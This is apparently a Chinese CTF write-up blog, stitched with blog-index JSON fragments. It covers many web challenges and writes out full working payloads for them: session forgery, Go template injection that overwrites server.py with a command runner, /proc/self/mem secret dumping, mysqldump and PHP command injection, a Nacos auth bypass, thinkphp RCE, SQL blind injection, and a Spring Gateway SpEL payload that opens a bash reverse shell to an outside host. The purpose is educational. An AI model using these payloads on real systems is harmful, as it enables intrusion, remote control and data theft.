如果获取不存在的环境变量就会返回空值,所以我们这里猜其实不存在环境变量,所以secret_key其实是空的,那这样的话就可以伪造admin用户了 伪造admin用户我们改下代码,然后获得伪造之后的session 1234567891011121314151617181920var store = sessions.NewCookieStore([]byte(&quot;&quot;))// key设置为空func Index(c *gin.Context) &#123; session, err := store.Get(c.Request, &quot;session-name&quot;) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; if session.Values[&quot;name&quot;] == nil &#123; session.Values[&quot;name&quot;] = &quot;admin&quot; // 将name改为admin err = session.Save(c.Request, c.Writer) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; &#125; c.String(200, &quot;Hello, guest&quot;)&#125; 得到伪造之后的session:(因为key为空，所以可以直接用别人生成的session) 1MTY4NTE2NjM0MXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwOKxem4pxrKun4XeKg9xm11WhWHL1uae0s725nzr61aA== 也可以把下面的代码加到rount.go里然后再访问,也可以得到admin用户的Key 123456func Key(c *gin.Context) &#123; session, _ := store.Get(c.Request, &quot;session-name&quot;) session.Values[&quot;name&quot;] = &quot;admin&quot; session.Save(c.Request, c.Writer) c.String(200, &quot;Hello, guest&quot;)&#125; 然后设置一下Cookie头到了这一步就开始go的ssti,前面已经说过了server.py开启了debug,所以说当server.py文件改变一次,那就会重新加载一次,所以我们这里就是要写入文件来覆盖掉原来的server.py文件 go的pongo2模板注入Go的标准库里有两个模板引擎, 分别是text/template和html/template, 两者接口一致, 区别在于html/template一般用于生成HTML输出, 它会自动转义单引号和双引号,所以我们这里要换个方式读取文件在这里我们发现gin.Context被注入到了模板中使用可以gin包的SaveUploadedFile（）进行文件上传 123456func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error/*第一个获取表单中的文件，第二个参数为保存的目录即: &#123;&#123;c.SaveUploadedFile(c.FormFile(&quot;file&quot;),&quot;/app/server.py&quot;)&#125;&#125;但是前面又提到html模板会对双引号进行编码,所以我们需要绕过*/ Context.HandlerName() HandlerName 返回主处理程序的名称。例如，如果处理程序是“handleGetUsers()”，此函数将返回“main.handleGetUsers”。 所以如果是在Admin()里，返回的就是main&#x2F;route.Admin然后配合过滤器last获取到最后一个字符串n 1&#123;&#123;c.HandlerName()|last&#125;&#125; 还有一个Context.Request.Referer()Request.Referer 返回header里的Referer的值 所以构建一个文件上传，然后覆盖server.py所以payload为:(来源为这里) 1/admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())&#125; 简单来说就是admin路由下有ssti,所以执行go的代码,然后上传server.py文件进行文件覆盖然后再访问&#x2F;flask路由来执行命令先执行上面的payload然后抓包:抓包之后主要有四步要修改 : 1.如果没有Referer头的话,记得添加Referer头,因为payload里的&#x2F;app&#x2F;server.py用Re头代替了Referer: &#x2F;app&#x2F;server.py 2.如果没有Content-Type头,记得添加Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundary8ALIn5Z2C3VlBqND 简单的来了解一下,为什么要加这个头:在http协议中使用form提交文件时需要将form标签的method属性设置为post，enctype属性设置为multipart&#x2F;form-data，并且有至少一个input的type属性为file时，浏览器提交这个form时会在请求头部的Content-Type中自动添加boundary属性。使用post上传文件时，不仅需要指定mutipart&#x2F;form-data来进行编码，还需要在Content-Type中定义boundary作为表单参数的分隔符。(简单的理解就是,这是我们用来上传文件的一个标志)并且请求体中不同部份以CRLF、”–”和header中的Boundary参数开头，要求被封装的内容不能出现与Boundary参数相同的字符，整个请求体以”–”结束。 3.记得把session改成我们之前伪造的那个admin的session 4.在body加上我们改之后的server.py文件,文件内容详见下面的包 下面是完整的发包 123456789101112131415161718192021222324252627282930313233GET /admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())&#125;&#125; HTTP/1.1Host: 1.14.xx.xx:12366Referer:/app/server.pyCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqNDAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: session-name=MTY4NTE2NjM0MXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwOKxem4pxrKun4XeKg9xm11WhWHL1uae0s725nzr61aA==Connection: closeContent-Length: 427------WebKitFormBoundary8ALIn5Z2C3VlBqNDContent-Disposition: form-data; name=&quot;n&quot;; filename=&quot;server.py&quot;Content-Type: text/plainfrom flask import *import osapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index(): name = request.args[&#x27;name&#x27;] file=os.popen(name).read() return fileif __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True)------WebKitFormBoundary8ALIn5Z2C3VlBqND-- 发包成功之后,访问flask路由,执行下面的payload 123/flask?name=%3fname=env或者/flask?name=%3fname=cat$IFS/th1s_1s_f13g //要用$IFS绕过空格 得到flagflag{8382843b-d3e8-72fc-6625-ba5269953b23} 这个地方补充一下，为什么最后的payload是 1/flask?name=%3fname=env 有个师傅问我这里为什么是两个name连着写，这个payload怎么来的呢？我看到这个问题的时候，我简单的回想了一下这题的过程，然后去网上搜搜有没有相关的wp有解释，发现大家几乎都是一笔带过，也没有对这个点有过多的解释，当时自己可能也是网上说啥就是啥了，这样给我带来了一个提醒，复现的话就要每个点都吃透。好啦，开始解释吧，解决这个问题过程中我求助了一位师傅，感觉自己还是不太会抓问题重点我们先看到go里的flask路由那个地方 123456789101112131415161718func Flask(c *gin.Context) &#123; session, err := store.Get(c.Request, &quot;session-name&quot;) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; if session.Values[&quot;name&quot;] == nil &#123; if err != nil &#123; http.Error(c.Writer, &quot;N0&quot;, http.StatusInternalServerError) return &#125; &#125; resp, err := http.Get(&quot;http://127.0.0.1:5000/&quot; + c.DefaultQuery(&quot;name&quot;, &quot;guest&quot;)) //这里是重点地方if err != nil &#123; return &#125; defer resp.Body.Close() body, _ := io.ReadAll(resp.Body) 我们看到上面标注的那行里的DefaultQuery，介于网上搜索到的相关知识点比较少，这里建议直接去看官方文档看到官方文档里的这几行上面几行注释就是几个例子，name和lastname是url上就有的参数，所以c.DefaultQuery(&quot;name&quot;, &quot;unknown&quot;) 直接返回的是url上给他的赋值，也就是Manu，同理，对于lastname的返回值也就是空，因为url上有这个参数但是确没有给他赋值，那对于url上不存在的参数呢，比如c.DefaultQuery(&quot;id&quot;, &quot;none&quot;)就为默认值，也就是defaultValue string，这里对于id来说，就是none那在这里我们最后的payload是/flask?name=%3fname=env，那拼接到这里就应该是http://127.0.0.1:5000?name=env，而这个时候的5000端口上的东西是我们之前覆盖的server.py文件，那我们看到我们覆盖的文件里的内容，我们传参name，并且去os.popen代码执行这个参数的指令 所以/flask?name=%3fname=env其实就是/server.py?name=env，从而读取了环境变量了。其实这里我们上传的server.py文件里面最好不要设置成name这个参数，感觉可能是两个name连着一起有点误导人了可以改个参数，比如把上面的一段，改成下面这样，这样最后payload就是/flask?name=?cmd=env 12345@app.route(&#x27;/&#x27;) def index(): cmd = request.args[&#x27;cmd&#x27;] file=os.popen(cmd).read() return file 看到这里你会不会还有点懵？那再来好好理一遍这个思路。首先我们从浏览器访问，然后传参，route.go接收到用户访问的url之后，通过DefaultQuery裁切url上的参数，然后将返回的值拼接给本地的flask服务，flask服务默认在5000端口开启，所以也就是 127.0.0.1:5000，所以Payload：/flask?name=%3fname=env，经过第一层route.go里面的DefaultQuery裁切之后，只剩下%3fname=env，然后这一段拼接给flask，这时候触发了覆盖的server.py文件，进而执行了命令，查看到了环境变量。这样一遍理下来就很清楚啦。看到这里你会不会联想到一开始的这里为什么会报错，报错之后为什么又可以得到源码呢？这里我们把/?flask?name按照我们刚刚的思路，是不是最后就是127.0.0.1:5000了，因为name为空，所以后面自然也没有跟东西，我们看到获取name参数值的地方我们把这段代码拿去测试一下，正常赋值，没问题当为空的时候，也就是直接?name的时候，可以看到报错了是因为这个地方想要name参数，但是没有得到，所以这也是为什么我们会传两个name参数的原因那为什么报错了就会得到源码呢，因为这里打开了flask的debug模式，报错了就会直接回显源码 其实这道题还有另外的解法，就是如果我们都可以命令执行了，那想到之前师傅说的一个小点子，用grep直接全局查找不就好了？这样也不用去研究那么多东西了，直接 file=os.popen(“grep -R flag”).read()然后直接访问直接访问 /flask?name=，变成127.0.0.1:5000，触发命令执行，回显flag reading主页是空白的,就想到可能是目录穿越,这里把..replace成了. 所以我们要用…代表一级先看到app.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101# -*- coding:utf8 -*- import os import math import time import hashlib from flask import Flask, request, session, render_template, send_file from datetime import datetime app = Flask(__name__) app.secret_key = hashlib.md5(os.urandom(32)).hexdigest() key = hashlib.md5(str(time.time_ns()).encode()).hexdigest() books = os.listdir(&#x27;./books&#x27;) books.sort(reverse=True) @app.route(&#x27;/&#x27;) def index(): if session: book = session[&#x27;book&#x27;] page = session[&#x27;page&#x27;] page_size = session[&#x27;page_size&#x27;] total_pages = session[&#x27;total_pages&#x27;] filepath = session[&#x27;filepath&#x27;] words = read_file_page(filepath, page, page_size) return render_template(&#x27;index.html&#x27;, books=books, words=words) return render_template(&#x27;index.html&#x27;, books=books ) @app.route(&#x27;/books&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) def book_page(): if request.args.get(&#x27;book&#x27;): book = request.args.get(&#x27;book&#x27;) elif session: book = session.get(&#x27;book&#x27;) else: return render_template(&#x27;index.html&#x27;, books=books, message=&#x27;I need book&#x27;) book=book.replace(&#x27;..&#x27;,&#x27;.&#x27;) filepath = &#x27;./books/&#x27; + book if request.args.get(&#x27;page_size&#x27;): page_size = int(request.args.get(&#x27;page_size&#x27;)) elif session: page_size = int(session.get(&#x27;page_size&#x27;)) else: page_size = 3000 total_pages = math.ceil(os.path.getsize(filepath) / page_size) if request.args.get(&#x27;page&#x27;): page = int(request.args.get(&#x27;page&#x27;)) elif session: page = int(session.get(&#x27;page&#x27;)) else: page = 1 words = read_file_page(filepath, page, page_size) prev_page = page - 1 if page &gt; 1 else None next_page = page + 1 if page &lt; total_pages else None session[&#x27;book&#x27;] = book session[&#x27;page&#x27;] = page session[&#x27;page_size&#x27;] = page_size session[&#x27;total_pages&#x27;] = total_pages session[&#x27;prev_page&#x27;] = prev_page session[&#x27;next_page&#x27;] = next_page session[&#x27;filepath&#x27;] = filepath return render_template(&#x27;index.html&#x27;, books=books, words=words ) @app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) def flag(): if hashlib.md5(session.get(&#x27;key&#x27;).encode()).hexdigest() == key: return os.popen(&#x27;/readflag&#x27;).read() else: return &quot;no no no&quot; def read_file_page(filename, page_number, page_size): for i in range(3): for j in range(3): size=page_size + j offset = (page_number - 1) * page_size+i try: with open(filename, &#x27;rb&#x27;) as file: file.seek(offset) words = file.read(size) return words.decode().split(&#x27;\\n&#x27;) except Exception as e: pass #if error again offset = (page_number - 1) * page_size with open(filename, &#x27;rb&#x27;) as file: file.seek(offset) words = file.read(page_size) return words.split(b&#x27;\\n&#x27;) if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=&#x27;8000&#x27;) 这里看到要获得flag,则需要key,而key又是通过session获得的,想要伪造session我们又需要知道secret_key首先我们先来了解两个路径 1234567/proc/self路径为获取当前环境下的文件,比如/proc/self/environ用于获取当前环境下的环境变量/proc/self/maps:maps显示当前进程各虚拟地址段的属性，包括虚拟地址段的起始终止地址、读写执行属性、vm_pgoff、主从设备号、i_ino、文件名。基于里面信息能大概判断泄露的内存的属性，是哪个区域在泄漏、对应哪个文件。辅助工具procmem输出更可读的maps信息。/proc/self/mem:/proc/self/men这个文件是一个特殊的文件,它允许对当前的进程的内存进行直接读取和写入操作,通过读写这个文件,可以访问当前进程的完整内存空间,包括代码段,数据段,堆,栈和其他映射的内存区域 所以我们输入下面的payload读取一下: 1/books?book=.../.../.../.../.../.../.../.../.../.../.../.../.../.../.../.../proc/self/maps 那么总的思路就是:思路就是利用任意文件读取读 &#x2F;proc&#x2F;self&#x2F;maps 获取 python 相关程序的地址然后读 &#x2F;proc&#x2F;self&#x2F;mem 拿到堆里面的 secret key 和 key, 伪造 session 最后访问 &#x2F;flag 路由 任意文件读取下面放上读men的脚本记得要在linux下执行 1234567891011121314151617181920212223242526272829303132333435363738394041424344import os,requests,redef dowload(file,offset=0,length=0): if offset: page = int(offset) // int(length) print(f&quot;&#123;url&#125;books?book=.../.../.../.../...&#123;file&#125;&amp;page=&#123;str(page)&#125;&amp;page_size=&#123;length&#125;&quot;) res=requests.get(f&quot;&#123;url&#125;books?book=.../.../.../.../...&#123;file&#125;&amp;page=&#123;str(page)&#125;&amp;page_size=&#123;length&#125;&quot;) else: res = requests.get(f&quot;&#123;url&#125;books?book=.../.../.../.../...&#123;file&#125;&amp;page=1&amp;page_size=2000000000&quot;) text=res.text return texturl=&quot;http://1.1.1.1:12345/&quot;# 读取/proc/self/mapsmaps = open(f&#x27;maps&#x27;, &#x27;wb&#x27;)maps.write(dowload(&quot;/proc/self/maps&quot;).encode())maps.close()# 清空本地save目录os.system(&quot;rm -rf ./save;mkdir save&quot;)for i in open(&#x27;maps&#x27;,&#x27;r&#x27;).read().split(&#x27;\\n&#x27;): if &quot;.so&quot; in i or &quot;lib&quot; in i or&quot;python3&quot; in i or&quot;dev&quot; in i: continue t = re.search(r&#x27;[0-9a-f]&#123;12&#125;-[0-9a-f]&#123;12&#125;&#x27;, i) if t: location = t.group().split(&quot;-&quot;) else: continue try: start, end=&quot;0x&quot;+location[0],&quot;0x&quot;+location[1] except: continue print(&quot;./save/&quot;+start+&quot;-&quot;+end) save = open( &quot;./save/&quot;+start+&quot;-&quot;+end,&quot;wb&quot; ) save.write( dowload( &quot;/proc/self/mem&quot;, str(int(start,16)), str(int(end,16)-int(start,16)) ).encode() ) 运行之后会生成一个save文件夹，然后打开这个文件夹然后用正则表达式 – [a-f0-9]{32}去搜索MD5格式的字符串，找到两串很相似的md5字符串猜测一个是key一个是secret_key，把这两个都拿去验证一下，看那个可以解session，哪个就是secret_key，那另一个就是key 先在Linux下输入： 123python3import timetime.time_ns 爆破时间戳伪造session输出几个时间戳看一下，发现前面几个字符都是一样的之后用hashcat工具爆破时间戳 1hashcat -m 0 -a 3 &quot;key值&quot; &quot;168534084?d?d?d?d?d?d?d?d?d?d&quot; 爆破出时间戳之后，结合secret_key一起伪造session 1python3 flasksession.py encode -s &quot;secret_key&quot; -t &quot;&#123;&#x27;key&#x27;:&#x27;时间戳&#x27;&#125;&quot; 得到伪造后的session后，抓包修改，然后访问 &#x2F;flag 即可得到flagflag{8382843b-d3e8-72fc-6625-ba5269953b23} DebugSer（无，Java还没学）dumpit这道题没有找到环境，就跟着网上大佬的wp来过一遍吧打开题目：查看日志，日志内容如下，（其实这不是什么日记，是备份的数据库）搜索了一下，发现是mysqldump导出文件的格式，根据题目提示，应该是命令注入 mysqldump命令注入发现–result-file,-r可以控制文件的输出位置，而且这里的两个参数可控，所以直接命令执行 12?db=&#x27;&lt;?php phpinfo()?&gt;&#x27;&amp;table_2_dump=flag1 --result-file=log/1.php//然后访问：http://xxx/log/1.php 查看phpinfo，搜索flag 还可以用下面的payload 12?db=ctf&amp;table_2_dump=\\%3C\\?\\=phpinfo\\(\\)?\\%3E%202%3E%20log/1.php//利用转义符号将&lt;?=phpinfo()?&gt;写入log/1.php中，然后进行访问http://xxx/log/1.php 这里有个非预期，出题人没有把环境变量删掉，我们可以直接读取环境变量来读flag （非预期）%0A截断绕过读取环境变量12?db=ctf&amp;table_2_dump=%0Aenv//使用%0A做截断，相当于换行执行之后的命令。这里就相当于是env读取环境变量 BackendService好的，这道题也没有找到环境…首先是CVE-2021-29441 CVE-2021-29441身份验证绕过打开环境是一个nacos页面（没看到题目，但是盲猜应该是下面这样，（图取自网络），就应该是个登录框）参考这篇文章可知我们只需要在header添加了user-agent：Nacos-Server时，就会绕过身份验证直接登录nacos账户 1234//post传参username=admin&amp;password=admin//并且把UA头改成下面这样user-agent：Nacos-Server 这样就成功的新建了一个用户名和密码都为admin的用户了登录然后进入后台 Nacos结合Spring Cloud Gateway RCE利用先看篇参考文章了解一下，题目复现wp主要来自https://pysnow.cn/archives/713/进入后台查看源码（详细代码可见上面提到的那篇wp），可知： backendserver为provider服务，监听在8811端口上。（application.yaml）内部配置服务有个8888的gateway服务，id为backcfg。可以直接访问这个内部服务。并且这个服务接受json格式 （bootstrap.yml）这里可以通过修改gateway配置文件反代backendservice服务去nacos后台添加配置然后反弹shell即可：服务器开启监听： 1nc -lvp 6666 然后poc如下：(poc来源) 12345678910111213141516171819202122232425262728&#123; &quot;spring&quot;: &#123; &quot;cloud&quot;: &#123; &quot;gateway&quot;: &#123; &quot;routes&quot;: [ &#123; &quot;id&quot;: &quot;exam&quot;, &quot;order&quot;: 0, &quot;uri&quot;: &quot;lb://backendservice&quot;, &quot;predicates&quot;: [ &quot;Path=/echo/**&quot; ], &quot;filters&quot;: [ &#123; &quot;name&quot;: &quot;AddResponseHeader&quot;, &quot;args&quot;: &#123; &quot;name&quot;: &quot;result&quot;, &quot;value&quot;: &quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;, &#x27;-c&#x27;, &#x27;bash -i &gt;&amp; /dev/tcp/x.xx.xx.xx/6666 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\\r&#x27;,&#x27;&#x27;)&#125;&quot; &#125; &#125; ] &#125; ] &#125; &#125; &#125;&#125; 注意添加配置时的：Data ID要写backcfg，Group为DEFAULT_GROUP然后再：cat &#x2F;flag 即可得到flag(后面发现ctfshow有环境了，那来简单的复现一下吧)","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"NSSCTF刷题记录⑤--web","slug":"nss⑤","date":"2024-01-08T06:27:45.591Z","updated":"2024-01-08T06:45:37.449Z","comments":true,"path":"2024/01/08/nss⑤/","link":"","permalink":"https://qingwan.top/2024/01/08/nss%E2%91%A4/","excerpt":"比较基础的一些web题⑤","text":"比较基础的一些web题⑤ [羊城杯 2020]easycon访问Index.php这道题一打开是这样的一个页面，感觉这题更偏向misc一般的php主页面都是index.html我们这里可以试着访问一下index.php然后发现是一个一句话木马，然后直接传参执行命令即可POST传参 1cmd=system(&quot;cat bbbbbbbbb.txt &quot;); 然后得到一堆base64编码的东西，拿去解码发现jpg的头，所以尝试下用Base64转图片的在线网站试试 Base64解码转图片NSSCTF&#123;do_u_kn0w_c@idao&#125; [UUCTF 2022 新生赛]ez_rce打开是源码 1234567891011121314151617181920居然都不输入参数，可恶!!!!!!!!!&lt;?php## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if (!preg_match(&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\\$|\\*|\\+|\\^|scan|\\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;,$code))&#123; echo &#x27;看看你输入的参数！！！不叫样子！！&#x27;;echo &#x27;&lt;br&gt;&#x27;; eval($code); &#125; else&#123; die(&quot;你想干什么？？？？？？？？？&quot;); &#125;&#125;else&#123; echo &quot;居然都不输入参数，可恶!!!!!!!!!&quot;; show_source(__FILE__);&#125; 看到过滤了很多执行命令的函数，这里我们可以用 反引号 执行命令然后用print回显出来进行绕过那些过滤了的命令可以加反斜杠进行绕过 关键词反斜杠绕过+反引号执行命令+Print回显+空格用+绕过12345?code=printf(`l\\s`);?code=printf(`l\\s+/`);?code=printf(`c\\at+/fffffffffflagafag`);#这里的空格也可以用url编码的%20绕过，比如?code=printf(`c\\at+/fffffffffflagafag`); NSSCTF&#123;This_IS_s0_easy_RCE&#125; [NSSRound#1 Basic]basic_check打开啥都没有，来用dirsearch扫一波dirsearch -u http://node4.anna.nssctf.cn:28766/ -e* 嘻嘻，啥都没有，然后用curl扫描一下 curl扫描 他允许PUT方法，而且PUT方法可以用来上传文件 PUT方法上传文件然后抓包上传文件（可以先转换成POST方法，然后再手动改成PUT方法） 12/111.php?sss=ls //111.php?sss=cat /flag NSSCTF&#123;400c595f-164c-4127-bb02-edf0fb5e9c34&#125; [HNCTF 2022 Week1]easy_html打开环境，提示看cookie，cookie中提示文件f14g.php，访问之后是一个登录框 绕过前端限制这里说输入手机号登录，但是前端限制了输入的长度最多为10位，所以我们就修改前端的长度即可，把最大长度修改的比11大就行，然后再输入手机号即可拿到flagNSSCTF&#123;034f24bd-4def-42a2-8c97-a2111ad82b82&#125; [GDOUCTF 2023]受不了一点1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 &lt;?phperror_reporting(0);header(&quot;Content-type:text/html;charset=utf-8&quot;);if(isset($_POST[&#x27;gdou&#x27;])&amp;&amp;isset($_POST[&#x27;ctf&#x27;]))&#123; $b=$_POST[&#x27;ctf&#x27;]; $a=$_POST[&#x27;gdou&#x27;]; if($_POST[&#x27;gdou&#x27;]!=$_POST[&#x27;ctf&#x27;] &amp;&amp; md5($a)===md5($b))&#123; if(isset($_COOKIE[&#x27;cookie&#x27;]))&#123; if ($_COOKIE[&#x27;cookie&#x27;]==&#x27;j0k3r&#x27;)&#123; if(isset($_GET[&#x27;aaa&#x27;]) &amp;&amp; isset($_GET[&#x27;bbb&#x27;]))&#123; $aaa=$_GET[&#x27;aaa&#x27;]; $bbb=$_GET[&#x27;bbb&#x27;]; if($aaa==114514 &amp;&amp; $bbb==114514 &amp;&amp; $aaa!=$bbb)&#123; $give = &#x27;cancanwordflag&#x27;; $get =&#x27;hacker!&#x27;; if(isset($_GET[&#x27;flag&#x27;]) &amp;&amp; isset($_POST[&#x27;flag&#x27;]))&#123; die($give); &#125; if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; die($get); &#125; foreach ($_POST as $key =&gt; $value) &#123; $$key = $value; &#125; foreach ($_GET as $key =&gt; $value) &#123; $$key = $$value; &#125; echo $flag; &#125;else&#123; echo &quot;洗洗睡吧&quot;; &#125; &#125;else&#123; echo &quot;行不行啊细狗&quot;; &#125; &#125;&#125;else &#123; echo &#x27;菜菜&#x27;;&#125;&#125;else&#123; echo &quot;就这?&quot;;&#125;&#125;else&#123; echo &quot;别来沾边&quot;;&#125;?&gt;别来沾边 数组比较，数字比较123456#get传参?aaa=114514&amp;bbb=114514a&amp;1=flag&amp;flag=1#post传参gdou[]=1&amp;ctf[]=2#cookie传参cookie=j0k3r NSSCTF&#123;2bb0f907-3501-4451-9482-7996ef29a181&#125; [SWPUCTF 2022 新生赛]ez_ez_php(revenge)源码为 123456789101112131415 &lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123; if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123; echo &quot;Nice!!!&quot;; include($_GET[&quot;file&quot;]); &#125; else &#123; echo &quot;Hacker!!&quot;; &#125;&#125;else &#123; highlight_file(__FILE__);&#125;//flag.php 伪协议1?file=php://filter/read=covert,vase64-encode/resource=/flag NSSCTF&#123;9c292bd8-0bdd-481b-b810-38907f0b2246&#125; [SWPUCTF 2022 新生赛]奇妙的MD5抓个包看一下看到hint提示 md5中神奇的字符-ffifdyop经过md5加密后：276f722736c95d99e921722cf9ed621c再转换为字符串：&#39;or&#39;6&lt;乱码&gt; 即 &#39;or&#39;66�]��!r,��b用途：select * from admin where password=&#39;&#39;or&#39;6&lt;乱码&gt;&#39;，or后面的第一个字母只要不是0，都会被认为是true，从而实现sql注入的绕过就相当于select * from admin where password=&#39;&#39;or 1 实现sql注入所以第一关输入ffifdyopF12找到线索，md5的弱比较get传参 1x=s878926199a&amp;y=s155964671a 最后一关 123456789&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;wqh&#x27;]!==$_POST[&#x27;dsy&#x27;]&amp;&amp;md5($_POST[&#x27;wqh&#x27;])===md5($_POST[&#x27;dsy&#x27;]))&#123; echo $FLAG;&#125; md5强比较post传参 1wqh[]=1&amp;dsy[]=2 NSSCTF&#123;94ead189-4555-42ea-bb83-0580a4b4fa68&#125; [HNCTF 2022 Week1]easy_upload直接一句话木马NSSCTF&#123;1a845aba-d706-4c2c-901f-dbb11bb94e12&#125; [鹤城杯 2021]Middle magic12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phphighlight_file(__FILE__);include &quot;./flag.php&quot;;include &quot;./result.php&quot;;if(isset($_GET[&#x27;aaa&#x27;]) &amp;&amp; strlen($_GET[&#x27;aaa&#x27;]) &lt; 20)&#123; $aaa = preg_replace(&#x27;/^(.*)level(.*)$/&#x27;, &#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;, $_GET[&#x27;aaa&#x27;]); if(preg_match(&#x27;/pass_the_level_1#/&#x27;, $aaa))&#123; echo &quot;here is level 2&quot;; if (isset($_POST[&#x27;admin&#x27;]) and isset($_POST[&#x27;root_pwd&#x27;])) &#123; if ($_POST[&#x27;admin&#x27;] == $_POST[&#x27;root_pwd&#x27;]) echo &#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;; // START FORM PROCESSING else if (sha1($_POST[&#x27;admin&#x27;]) === sha1($_POST[&#x27;root_pwd&#x27;]))&#123; echo &quot;here is level 3,do you kown how to overcome it?&quot;; if (isset($_POST[&#x27;level_3&#x27;])) &#123; $level_3 = json_decode($_POST[&#x27;level_3&#x27;]); if ($level_3-&gt;result == $result) &#123; echo &quot;success:&quot;.$flag; &#125; else &#123; echo &quot;you never beat me!&quot;; &#125; &#125; else&#123; echo &quot;out&quot;; &#125; &#125; else&#123; die(&quot;no&quot;); &#125; // perform validations on the form data &#125; else&#123; echo &#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;nonono!&#x27;; &#125; echo &#x27;&lt;hr&gt;&#x27;;&#125;?&gt; 首先正则，第一关必须为pass_the_level_1#但是又绕过了Pass，正则表示匹配pass两边的字符并且进行替换 换行符绕过正则直接换行绕过。.点号不会匹配换行符%0a%0apass_the_level_1%23第二个是sha1强相等绕过 sha1强相等绕过–数组绕过admin[]=1&amp;root_pwd[]=2 第三关随便传入就行level_3=&#123;“result”:0&#125;NSSCTF&#123;41e5162c-2a22-48d7-8109-e20e2352a3da&#125; [HNCTF 2022 Week1]What is Web直接f12NSSCTF&#123;Hell0_Weber_Wec0m3_come_2_web_w0r1d!&#125; [SWPUCTF 2022 新生赛]ez_rcethinkphp历史漏洞扫一下目录看一下robots.txt然后访问一下/NSS/index.php/应该是考历史漏洞，thinkphpv5.0.22https://xz.aliyun.com/t/9361浅浅复现一下吧?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /nss/ctf/flag/flag得到flag NSSCTF&#123;c3da9ab0-00c3-4a2c-baf0-34f5b986aaae&#125;","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"NSSCTF刷题记录④--web","slug":"nss④","date":"2024-01-08T06:27:34.064Z","updated":"2024-01-16T13:43:43.864Z","comments":true,"path":"2024/01/08/nss④/","link":"","permalink":"https://qingwan.top/2024/01/08/nss%E2%91%A3/","excerpt":"比较基础的一些web题④","text":"比较基础的一些web题④ [CISCN 2019华北Day2]Web1 Hack World打开页面是一个查询界面，提示找到flag表和flag列测试一下 1231 //正常回显：Hello, glzjin wants a girlfriend.1&#x27; //显示：bool(false)，则判断类型为布尔盲注1&#x27; and 1=1# //显示SQL Injection Checked,应该是过滤了什么东西，经过测试是过滤了and和空格 布尔盲注先来了解些布尔盲注相关的常用的函数 12345678910111213（1）length：返回值为字符串的字节长度（2）ascii：把字符转换成ascii码值的函数（3）substr(str, pos, len)：在str中从pos开始的位置（起始位置为1），截取len个字符例如：substr（abcd，1，1） 从第一位开始（也就是从a开始）截取一个字符，就是a substr（abcd，2，1） 从第二位开始，截取一个字符，就是b substr（abcd，2，3） 从第二位开始，截取三个字符，就是bcd（4）count：统计表中记录的一个函数，返回匹配条件的行数（5）limit：limit m ：检索前m行数据，显示1-10行数据（m&gt;0） 异或绕过这里我们可以使用异或来代替or输入 12345670^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)//正常回显]/* 大概在这里应用就是假^假 =真 ，真^真=假，假^真=真，真^假=真 当我们查询 1^0、0^1、和 1 的回显是一样的，而查询 1^1 或0^0却会有报错提示。所以结合 sql语句 